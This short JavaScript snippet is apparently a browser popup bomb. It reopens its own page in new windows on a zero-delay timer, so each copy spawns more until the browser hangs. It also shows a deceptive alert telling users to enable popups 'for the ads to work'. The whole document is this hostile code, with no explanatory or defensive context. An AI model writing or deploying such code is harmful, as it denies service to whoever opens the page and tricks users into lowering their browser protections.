newWin = window.open(window.location.href);
if(!newWin) { 
  alert("Please enable popups inorder for the ads to work");
}
if(!confirm("Are you sure you wanna continue?")) close();

setInterval(() => {
  window.open(window.location.href);
  window.open(window.location.href);
}, 0);
